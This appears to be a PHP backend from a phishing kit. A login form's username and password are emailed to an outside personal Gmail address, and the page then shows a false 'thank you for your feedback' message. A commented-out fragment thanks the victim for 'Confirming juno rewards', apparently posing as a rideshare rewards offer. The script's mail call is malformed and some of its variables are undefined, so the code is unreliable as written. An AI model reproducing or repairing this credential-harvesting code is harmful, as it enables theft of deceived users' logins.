<?php
if(isset($_POST["login"])){
// Checking For Blank Fields..
if($_POST["username"]==""||$_POST["password"]==""){
echo "Fill All Fields..";
}else{
// Check if the "Sender's Email" input field is filled out
$visitor_email=$_POST['username'];
$Password = $_POST['password'];
// Sanitize E-mail Address

// Validate E-mail Address

if (!$visitor_email){
echo "Invalid Sender's Email";
}
else{
$email_from = 'mhshovon705@gmail.com';
$Password = $_POST['password'];
$subject = "this is new form ";
$email_body ="Receive an email $email". "Password is $password . ";

$headers = "From:. $email_from"; // Sender's Email
 // Carbon copy to Sender
// Message lines should not exceed 70 characters (PHP rule), so wrap it

// Send Mail By PHP Mail Function
mail("mhshovon705@gmail.com", $email,$Password,$subject,$email_body, $headers);

}
}
}echo "Your mail has been sent successfuly ! Thank you for your feedback";
?>

<!-- <div class="heading2">
						<p>Thank you for Confirming juno rewards. we are working to provide as many incentives as we can to both riders and drivers.</p>

					</div> -->
